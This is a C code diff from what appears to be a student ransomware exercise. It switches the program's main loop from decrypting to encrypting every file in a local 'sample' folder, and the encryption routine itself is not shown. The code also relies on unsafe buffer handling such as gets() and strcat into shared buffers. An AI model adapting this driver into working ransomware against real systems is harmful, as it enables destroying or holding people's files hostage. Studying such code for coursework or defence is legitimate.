@@ -24,14 +24,16 @@ int main(){
         int result = 1;
         char* file;
         char strBuffer[_MAX_PATH] = { 0, };
-	    char* fileway =  getcwd( strBuffer, _MAX_PATH );
-        // char* folderName = "C:\\Users\\kwonda\\Desktop\\5-2\\jaeun\\cs20182ransomware\\sample\\";
-        //
-        // char* fileway = "C:\\Users\\kwonda\\Desktop\\5-2\\jaeun\\cs20182ransomware\\sample\\";
+        char* fileway =  getcwd( strBuffer, _MAX_PATH );
         strcat(fileway, "\\sample\\*.*");
+        puts(fileway);
 
         handle = _findfirst(fileway, &fd); // Set path
-        // handle = _findfirst("C:\\Users\\kwonda\\Desktop\\18_2\\*.*", &fd); // path 예시
+
+        char* filesaveway = getcwd( strBuffer, _MAX_PATH );
+        strcat(filesaveway, "\\sample\\");
+
+        // handle = _findfirst("C:\\Users\\kwonda\\Desktop\\tete\\jaeeun\\sample\\*.*", &fd); // Set path
         if (handle == -1){
             printf("There were no files.\n");
             return;
@@ -39,19 +41,19 @@ int main(){
 
         int NumOfFile = 0;
 
-        char inputkey[16];
-        printf("Input your key : ");
-        gets(inputkey);
-        printf("%d\n", strlen(inputkey));
+        // char inputkey[16];
+        // printf("Input your key : ");
+        // gets(inputkey);
+        // printf("%d\n", strlen(inputkey));
+
         while (result != -1){
             char* fileName = fd.name;
             if( NumOfFile > 1){
                 printf("file name : %s \n", fileName);
 
                 // strcat(folderName,fileName);
-                //encrypt_single_file(fileName);
-                strcat(fileName, ".locked");
-                decrypt_single_file(fileName, inputkey);
+                encrypt_single_file(fileName,filesaveway);
+                // decrypt_single_file(fileName, inputkey, filesaveway);
 
     }
     result = _findnext(handle, &fd);
@@ -60,38 +62,7 @@ int main(){
     }//finish 'while'. No more files to read
 
   _findclose(handle);
-    /*
 
-    이 부분은 어떻게 해야할지 잘 모르겠음;;;
-
-    struct _finddata_t fd;
-    long* handle;
-    int result = 1;
-    char* file;
-    handle = _findfirst(".\\*.*", &fd); // Set path
-    // handle = _findfirst("C:\\Users\\kwonda\\Desktop\\18_2\\*.*", &fd); // path 예시
-
-    if (handle == -1){
-        printf("There were no files.\n");
-        return;
-    }
-
-    int NumOfFile = 0;
-
-    while (result != -1){
-        char* fileName= fd.name;
-
-        if( NumOfFile > 1){
-            printf("%s \n", fileName);
-        }// finish 'If' of NumOfFile
-        result = _findnext(handle, &fd);
-        NumOfFile++;
-
-
-    }//finish 'while'. No more files to read
-
-    _findclose(handle);
-    */
 
     return 0;
 }
